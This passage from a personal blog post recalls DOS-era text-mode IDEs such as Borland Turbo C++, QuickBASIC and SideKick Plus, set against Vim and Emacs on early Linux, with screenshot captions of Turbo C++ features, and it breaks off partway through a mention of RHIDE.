before.</span></p><p><span>“In my house”, we used something called </span><a href="https://en.wikipedia.org/wiki/Borland_Sidekick" rel="">SideKick Plus</a><span> (1984), which wasn’t really a code editor: it was more of a Personal Information Management (PIM) system with a built-in notepad. The cool thing about it, however, was that it was a Terminate and Stay Resident (TSR) program, which meant that it loaded in the background and you could bring it up at any time by pressing Ctrl+Alt.</span></p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F1e3c2211-437b-4e17-b24f-8ebbc7eb53eb_1264x948.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F1e3c2211-437b-4e17-b24f-8ebbc7eb53eb_1264x948.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F1e3c2211-437b-4e17-b24f-8ebbc7eb53eb_1264x948.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F1e3c2211-437b-4e17-b24f-8ebbc7eb53eb_1264x948.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F1e3c2211-437b-4e17-b24f-8ebbc7eb53eb_1264x948.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F1e3c2211-437b-4e17-b24f-8ebbc7eb53eb_1264x948.png" width="1264" height="948" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/1e3c2211-437b-4e17-b24f-8ebbc7eb53eb_1264x948.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:948,&quot;width&quot;:1264,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:65113,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F1e3c2211-437b-4e17-b24f-8ebbc7eb53eb_1264x948.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F1e3c2211-437b-4e17-b24f-8ebbc7eb53eb_1264x948.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F1e3c2211-437b-4e17-b24f-8ebbc7eb53eb_1264x948.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F1e3c2211-437b-4e17-b24f-8ebbc7eb53eb_1264x948.png 1456w" sizes="100vw" loading="lazy"></picture></div></a><figcaption>SideKick Plus' main screen after pressing Ctrl+Alt to bring it up. Note how DOS remains in the background.</figcaption></figure></div><p><span>Think of this TSR feature as rudimentary multitasking for an OS that did </span><em>not</em><span> have multitasking. This was really effective because quickly switching between code editing and building is critical for an efficient inner development loop. (And by the way, this past experience explains the design of the </span><a href="https://www.endbasic.dev/docs.html#intro-first" rel="">code editing flow in EndBASIC</a><span>. I did not implement the equivalent of Ctrl+Alt, but I’ve considered it many times.)</span></p><p><span>By this point, however, real IDEs had already existed for a few years. Turbo Pascal 1.0 (1983) shows the beginning of an integrated experience, although it did not feature its iconic TUI yet. QuickBASIC 2.0 (1986) shows more of a “traditional” TUI (the same as </span><code>EDIT.COM</code><span>, because they are the same editor), and MS-DOS 5 came with QBasic, a reduced version of QuickBASIC that didn’t allow compiling to native code but that had the same look.</span></p><p>The crown jewel of IDEs, in my opinion, were the later Borland Turbo series, which included Turbo C++ (1990), Turbo Assembler and Turbo Pascal. These IDEs were language specific, but they had full-screen TUIs and were extremely powerful.</p><p>Here, take a look at what we had. Syntax highlighting:</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Feaff10b2-c7af-4d06-9c1e-3aeeac48d2f9_1264x948.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Feaff10b2-c7af-4d06-9c1e-3aeeac48d2f9_1264x948.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Feaff10b2-c7af-4d06-9c1e-3aeeac48d2f9_1264x948.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Feaff10b2-c7af-4d06-9c1e-3aeeac48d2f9_1264x948.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Feaff10b2-c7af-4d06-9c1e-3aeeac48d2f9_1264x948.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Feaff10b2-c7af-4d06-9c1e-3aeeac48d2f9_1264x948.png" width="1264" height="948" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/eaff10b2-c7af-4d06-9c1e-3aeeac48d2f9_1264x948.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:948,&quot;width&quot;:1264,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:55763,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Feaff10b2-c7af-4d06-9c1e-3aeeac48d2f9_1264x948.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Feaff10b2-c7af-4d06-9c1e-3aeeac48d2f9_1264x948.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Feaff10b2-c7af-4d06-9c1e-3aeeac48d2f9_1264x948.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Feaff10b2-c7af-4d06-9c1e-3aeeac48d2f9_1264x948.png 1456w" sizes="100vw" loading="lazy"></picture></div></a><figcaption>Borland Turbo C++ showing a "Hello World" program to demonstrate syntax highlighting.</figcaption></figure></div><p>Compiler integration and diagnostics:</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F37cfb69d-5355-4c59-99b9-1555b5cba3b5_1264x948.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F37cfb69d-5355-4c59-99b9-1555b5cba3b5_1264x948.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F37cfb69d-5355-4c59-99b9-1555b5cba3b5_1264x948.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F37cfb69d-5355-4c59-99b9-1555b5cba3b5_1264x948.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F37cfb69d-5355-4c59-99b9-1555b5cba3b5_1264x948.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F37cfb69d-5355-4c59-99b9-1555b5cba3b5_1264x948.png" width="1264" height="948" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/37cfb69d-5355-4c59-99b9-1555b5cba3b5_1264x948.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:948,&quot;width&quot;:1264,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:62699,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F37cfb69d-5355-4c59-99b9-1555b5cba3b5_1264x948.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F37cfb69d-5355-4c59-99b9-1555b5cba3b5_1264x948.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F37cfb69d-5355-4c59-99b9-1555b5cba3b5_1264x948.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F37cfb69d-5355-4c59-99b9-1555b5cba3b5_1264x948.png 1456w" sizes="100vw" loading="lazy"></picture></div></a><figcaption>Borland Turbo C++ after compiling a program, showing a warning because I did not return a value from main().</figcaption></figure></div><p>Integrated project and build system management:</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ffedc5d3b-9816-439d-9aa8-0e04c3e40572_1264x948.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ffedc5d3b-9816-439d-9aa8-0e04c3e40572_1264x948.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ffedc5d3b-9816-439d-9aa8-0e04c3e40572_1264x948.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ffedc5d3b-9816-439d-9aa8-0e04c3e40572_1264x948.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ffedc5d3b-9816-439d-9aa8-0e04c3e40572_1264x948.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ffedc5d3b-9816-439d-9aa8-0e04c3e40572_1264x948.png" width="1264" height="948" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/fedc5d3b-9816-439d-9aa8-0e04c3e40572_1264x948.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:948,&quot;width&quot;:1264,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:78236,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ffedc5d3b-9816-439d-9aa8-0e04c3e40572_1264x948.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ffedc5d3b-9816-439d-9aa8-0e04c3e40572_1264x948.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ffedc5d3b-9816-439d-9aa8-0e04c3e40572_1264x948.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ffedc5d3b-9816-439d-9aa8-0e04c3e40572_1264x948.png 1456w" sizes="100vw" loading="lazy"></picture></div></a><figcaption>Borland Turbo C++ showing its project management and multi-window features. In the picture, you can see two C++ source files, with one depending on the other, and the project window listing all files that need to be compiled together.</figcaption></figure></div><p>A debugger with breakpoints, stack traces, and the like:</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F31c158ea-54c0-4d60-aee6-98c29d0c2c65_1264x948.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F31c158ea-54c0-4d60-aee6-98c29d0c2c65_1264x948.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F31c158ea-54c0-4d60-aee6-98c29d0c2c65_1264x948.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F31c158ea-54c0-4d60-aee6-98c29d0c2c65_1264x948.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F31c158ea-54c0-4d60-aee6-98c29d0c2c65_1264x948.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F31c158ea-54c0-4d60-aee6-98c29d0c2c65_1264x948.png" width="1264" height="948" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/31c158ea-54c0-4d60-aee6-98c29d0c2c65_1264x948.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:948,&quot;width&quot;:1264,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:72323,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F31c158ea-54c0-4d60-aee6-98c29d0c2c65_1264x948.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F31c158ea-54c0-4d60-aee6-98c29d0c2c65_1264x948.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F31c158ea-54c0-4d60-aee6-98c29d0c2c65_1264x948.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F31c158ea-54c0-4d60-aee6-98c29d0c2c65_1264x948.png 1456w" sizes="100vw" loading="lazy"></picture></div></a><figcaption>Borland Turbo C++ showing a debugging session with a program that contains multiple functions, a breakpoint, and the current call stack.</figcaption></figure></div><p>And even a full reference manual:</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F016e93a0-bc96-4437-b08a-3626c26bf07f_1264x948.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F016e93a0-bc96-4437-b08a-3626c26bf07f_1264x948.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F016e93a0-bc96-4437-b08a-3626c26bf07f_1264x948.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F016e93a0-bc96-4437-b08a-3626c26bf07f_1264x948.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F016e93a0-bc96-4437-b08a-3626c26bf07f_1264x948.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F016e93a0-bc96-4437-b08a-3626c26bf07f_1264x948.png" width="1264" height="948" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/016e93a0-bc96-4437-b08a-3626c26bf07f_1264x948.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:948,&quot;width&quot;:1264,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:107059,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F016e93a0-bc96-4437-b08a-3626c26bf07f_1264x948.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F016e93a0-bc96-4437-b08a-3626c26bf07f_1264x948.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F016e93a0-bc96-4437-b08a-3626c26bf07f_1264x948.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F016e93a0-bc96-4437-b08a-3626c26bf07f_1264x948.png 1456w" sizes="100vw" loading="lazy"></picture></div></a><figcaption>Borland Turbo C++ showing its integrated help system, with the "Hello World" program in the background and the help for printf.</figcaption></figure></div><p>Remember: all of this in the early 1990s—a little over 30 years ago at the time of this writing.</p><p><span>I was an avid user of Turbo C++, with which I learned a lot. I remember using their </span><code>conio.h</code><span> libraries to implement TUIs of my own, and then their builtin </span><code>graphics.h</code><span> libraries to play with implementing GUIs. And note: this was </span><em>without the Internet</em><span>. There was no option for many to just “look up how things worked” in Stack Overflow: the IDE had to be discoverable right away (which it was) and self-contained to offer you a complete development experience.</span></p><p>Now take a moment to compare this scene with Linux in the early 1990s.</p><p><span>In Linux, almost every program was </span><em>also</em><span> text based, but those programs did not come with a full-screen TUI. It just wasn’t “the Unix way”. I remember watching the X11 configuration tool (</span><code>XF86Setup</code><span>) or the OpenBSD installer and feeling shocked by how simplistic those were: me, a young teenager with barely any “real” coding experience, had written better-looking programs already.</span></p><p><span>In any case, this didn’t stop me from my quest to </span><em>not</em><span> use Windows. I continued to learn the ways of Linux and soon faced the “best” editors recommended by every book and community online: Vim and Emacs. And I could not understand why they were praised. Using these was like stepping back into the past. They were full-screen programs indeed, but they seemed pretty arcane. Vim did have syntax highlighting but it was far from being an IDE. Emacs could be configured to integrate with some code assisting features and the like, but it was far from being “fire and forget” like the Turbo family of IDEs.</span></p><p><span>Just look at the default Emacs configuration </span><em>today</em><span>, which hasn’t changed much (if at all) since then. It does have windows, but they aren’t decorated. It didn’t have colors (and now barely has), because why? It didn’t use to have mouse support. It </span><em>does</em><span> have a menu bar though, but it is just a gimmick? If you press M-` as the instructions tell you, you face a truly strange interface to navigate the menu—which makes one wonder why they even bothered to waste a full line of screen real state to show a menu bar that does nothing.</span></p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fe7d6424f-498d-4ded-94d6-76cd5205d563_973x650.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fe7d6424f-498d-4ded-94d6-76cd5205d563_973x650.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fe7d6424f-498d-4ded-94d6-76cd5205d563_973x650.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fe7d6424f-498d-4ded-94d6-76cd5205d563_973x650.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fe7d6424f-498d-4ded-94d6-76cd5205d563_973x650.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fe7d6424f-498d-4ded-94d6-76cd5205d563_973x650.png" width="973" height="650" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/e7d6424f-498d-4ded-94d6-76cd5205d563_973x650.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:650,&quot;width&quot;:973,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:127463,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fe7d6424f-498d-4ded-94d6-76cd5205d563_973x650.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fe7d6424f-498d-4ded-94d6-76cd5205d563_973x650.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fe7d6424f-498d-4ded-94d6-76cd5205d563_973x650.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fe7d6424f-498d-4ded-94d6-76cd5205d563_973x650.png 1456w" sizes="100vw" loading="lazy"></picture></div></a><figcaption>A fresh installation of Emacs in the console, with the standard welcome screen in the background and the "menu" open after pressing M-`.</figcaption></figure></div><p>Now try giving this to anyone with little coding experience and getting them to create, compile, and debug a program. They will have trouble just navigating the editor, and they won’t find any of the features that would allow for project management or compiler integration.</p><p>For comparison, in writing this post, I fired up Turbo C++ in DOSBox and I was able to create a “hello world” project and navigate the environment in minutes—all without prior knowledge (everything I had known has been forgotten by now). The environment is intuitive and, as an IDE, integrated all around.</p><p><span>Anyhow. Let’s forget about the past and look at what we have today in TUI-land. I don’t want to look at GUIs because… well, Visual Basic was the pinnacle of graphics programming and we don’t have that either anymore—which is also a topic for another day. (Well, OK, you have </span><a href="https://gambas.sourceforge.net/" rel="">Gambas</a><span>… but who knows about it?)</span></p><p><span>The closest more-modern equivalent to the Borland Turbo C++ environment is </span><a href="https://directory.fsf.org/wiki/RHIDE" rel="">RHIDE</a><span>. As you can see in the picture below, it looks incredibly similar—and you’d be forgiven if you thought this </span><em>is</em><span> Turbo C++. Unfortunately, it is DOS-only and seems to be mostly abandoned by now with its latest release dated 7 years ago.</span></p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd5155c1f-297e-4ce7-90b0-5d7e3db5384e_1264x948.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd5155c1f-297e-4ce7-90b0-5d7e3db5384e_1264x948.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd5155c1f-297e-4ce7-90b0-5d7e3db5384e_1264x948.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd5155c1f-297e-4ce7-90b0-5d7e3db5384e_1264x948.png 1272w, 